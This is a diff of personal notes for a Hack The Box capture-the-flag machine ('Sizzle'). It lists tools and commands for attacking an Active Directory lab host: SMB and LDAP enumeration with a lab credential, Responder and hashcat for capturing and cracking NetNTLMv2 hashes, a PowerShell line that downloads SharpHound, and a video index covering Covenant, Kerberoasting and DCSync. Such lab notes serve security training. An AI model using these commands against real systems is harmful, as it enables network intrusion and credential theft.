@@ -1,22 +1,162 @@
-- nmap -p 80 --script http-methods localhost
+*********
+  TOOLS
+*********
 
-PORT   STATE SERVICE
-80/tcp open  http
-| http-methods:
-|_  Supported Methods: GET HEAD POST OPTIONS
+- Nmap
+- Nslookup
+- Tshark/wireshark
+- Gobuster/dirbuster/dirsearch
+- Ldapsearch
+- Smbmap/smbclient
+- Mount/fin/for
+- xxd
+- Responder
+- Kracken
+- Hashcat
+- openSSL
+- Bloodhound
+- SimpleHTTPServer
+- Neo4j
+- Covenant
+- PSexec
+- Kerberoast
+- Mimikatz
+- VSCode/CherryTree
+
+************
+  SERVICES
+************
+
+- HTTP/HTTPS
+- FTP (Anonymous)
+- RPC
+- netbios/SMB
+- LDAP/SSL
+
+[1. ENUMERATION]
+
+>> nmap -p- -oA sizzle-allports 10.10.10.103
+
+>> nmap -p 80 --script http-methods localhost
+
+>> nmap -p 443 --script http-methods 10.10.10.103
 
 
-- nmap -p 443 --script http-methods 10.10.10.103
+[NMAP RESULT - SERVICES]
 
-Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-28 19:42 UTC
-Nmap scan report for 10.10.10.103
-Host is up (0.081s latency).
-PORT    STATE SERVICE
-443/tcp open  https
-| http-methods:
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
+>> 21/tcp   open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 
+>> 53/tcp   open  domain        Microsoft DNS
+
+>> 80/tcp   open  http          Microsoft IIS httpd 10.0
+
+>> 135/tcp  open  msrpc         Microsoft Windows RPC
+
+>> 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+
+>> 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+
+>> 443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+
+>> 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+
+>> 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+
+>> 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+
+>> 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+
+
+[DNS]
+
+$ nslookup
+> server 10.10.10.103
+> 127.0.0.1
+> 10.10.10.103
+> HTB.LOCAL
+> sizzle.htb.local
+
+$ vim /etc/hosts
+    >> 10.10.10.103  sizzle sizzle.htb.local htb.local htb
+
+$ vim /etc/resolv.conf
+    >> nameserver 172.16.10.1
+
+[SMBMAP]
+
+>> smbmap -H 10.10.10.103
+>> smbmap -H 10.10.10.103 -u null -p null
+>> smbmap -u amanda -d htb.local -P 'P@ssw0RD' -H 10.10.10.103
+
+[SMBCLIENT]
+
+>> smbclient -N -L //10.10.10.103   # -N = Null Auth
+>> smbclient -N '//10.10.10.103/Departments Shares'
+smb: /> ls -a
+
+[SMBCACLS]
+
+>> smbcacls -N '//10.10.10.103/Departments Shares' /Users
+
+[MOUNT]
+
+>> mount -t cifs '//10.10.10.103/Departments Shares' /mnt/disk
+
+[FIND]
+
+>> find . -ls |tee ~/smbrecon/tree.txt
+
+[FOR]
+
+>> for i in $(ls); do echo $i; done
+>> for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/Departments Shares' $i; done
+
+[XXD]
+
+>> xxd <filename>
+>> xxd <filename> |grep -v '0000 0000 0000 0000 0000 0000 0000'
+
+[RESPONDER]
+
+>> responder -I tun0 
+
+[HASHCAT]
+
+>> hashcat --example-hashes
+>> hashcat -m 5600 hashes/sizzle-netntlmv2 /opt/wordlist/rockyou.txt
+
+
+[GOBUSTER]
+>> gobuster -h http://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+>> gobuster -h http://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,307,401
+
+[LDAPSEARCH]
+
+>> ldapsearch -x -h sizzle.htb.local -s base namingcontexts
+>> ldapsearch -x -h sizzle.htb.local -s sub -b 'DC=HTB,DC=LOCAL'
+>> ldapsearch -x -h sizzle.htb.local -b 'dc=htb,dc=local'
+>> ldapsearch -x -h sizzle.htb.local -D 'amanda@hbt.local' -w 'P@ssw0RD' -b 'dc=htb,dc=local' 
+>> ldapsearch -x -h sizzle.htb.local -D 'amanda@hbt.local' -w 'P@ssw0RD' -b 'dc=htb,dc=local' "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=users,DC=htb,DC=local))" |grep sAMMAccountName
+
+[OPENSSL]
+
+>> openssl genrsa -aes256 -out amanda.key 2048          :: Generando Private Key
+>> openssl req -new -key amanda.key -out amanda.csr     :: Generando Certificado
+>> openssl x509 -in amanda.cer -text
+
+[SIMPLEHTTPSERVER]
+>> python -m SimpleHTTPServer 80
+
+[IEX]
+
+>> IEX(New-Object Net.WebClient).downloadFile('http://10.10.10.103/SharpHound.exe', 'SharpHound.exe')
+
+[IWR]
+
+>> IWR -Uri http://10.10.10.103/SharpHound.exe -OutFile SharpHound.exe
 
 [DOCUMENTATION]
 
@@ -27,8 +167,32 @@ PORT    STATE SERVICE
 
 
 
+***************
+ IPPSEC INDEX
+***************
+
+01:04 - Begin of Recon 
+06:45 - Checking the web interfaces 
+07:20 - Discovering there is a Certificate Authority 
+08:50 - Taking a look at LDAP 
+10:55 - Examining SMB to find shares 
+12:00 - Searching the Operations and Department Shares 
+14:50 - Viewing permissions of a SMB Share with SMBCACLS 
+19:10 - Discovering a writeable share, dropping a SCF File to get a hash 
+22:04 - Using Hashcat to crack NetNTLMv2 
+24:40 - Using SMBMap to identify if this user has access to anything extra 
+25:40 - Discovering the CertSRV Directory 28:00 - Discovering Powershell Remoting 
+30:00 - Error from WinRM (Need SSL) 31:00 - Using openSSL to generate a private key 
+31:52 - Going to /CertSRV to sign our certificate as Amanda 
+34:00 - Adding the SSL Authentication to WinrM 
+35:15 - Playing with LDAP Again (with the Amanda Creds) 
+37:50 - Shell on the box with WinRM as Amanda 
+38:15 - Running SharpHound 40:29 - Applocker is on the box, lets move it in the windows directory 42:00 - Trying to get the bloodhound data off the box. 44:20 - Starting bloodhound 45:27 - File didn't copy lets load up Covenant 49:30 - Covenant is up and running - Create a HTTP Listener 50:30 - Hosting a Launcher 52:30 - Getting a grunt 54:40 - Running SeatBelt 57:00 - Running SharpHound 60:00 - Finally uploading the bloodhound data 01:01:18 - Running Bloodhound with all Collection Methods 01:05:15 - Discovering the MRLKY can DCSYNC 01:07:25 - Cannot kerberoast because of the Double Hop Problem, create token with MakeToken 01:12:30 - Cracked the Kerberoasted Hash, doing maketoken with mrlky and running DCSYnc 01:14:40 - Running WMIExec to get Administrator 01:22:00 - UNINTENDED Method 1: Amanda can write to Clean.bat 01:24:30 - UNINTENDED Method 2: Forensic artifacts leave MRKLY Hash in C:\windows\system32\file.txt
+
+
 SOURCE: 
 
+- https://www.hackthebox.eu/home/machines/writeup/169
 - https://snowscan.io/htb-writeup-sizzle/#
 - https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)
 - https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
